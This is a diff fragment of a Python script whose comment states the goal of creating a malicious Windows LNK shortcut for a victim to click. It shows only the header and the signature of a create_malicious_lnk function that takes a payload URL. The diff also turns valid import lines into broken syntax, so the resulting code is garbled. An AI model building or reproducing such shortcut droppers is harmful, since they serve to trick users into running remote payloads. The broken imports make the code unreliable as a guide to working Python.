@@ -3,8 +3,8 @@
 # Objective: Create a malicious LNK file for a user to click. This script generates the file locally on the attacker's machine.
 
 #!/usr/bin/env python3
-import os
-from pypkjs import LnkFile
+import os from pypkjs
+import LnkFile
 
 def create_malicious_lnk(output_path, payload_url):
     """
